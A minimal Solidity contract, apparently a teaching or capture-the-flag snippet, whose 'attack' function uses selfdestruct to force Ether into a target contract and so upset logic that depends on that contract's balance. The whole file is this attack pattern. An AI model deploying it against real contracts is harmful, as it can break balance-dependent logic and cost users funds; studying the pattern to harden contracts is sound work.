// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

contract ForceEthSend {
    function attack(address _ethStoreAddress) public payable{
        selfdestruct(payable(_ethStoreAddress));
    }
}
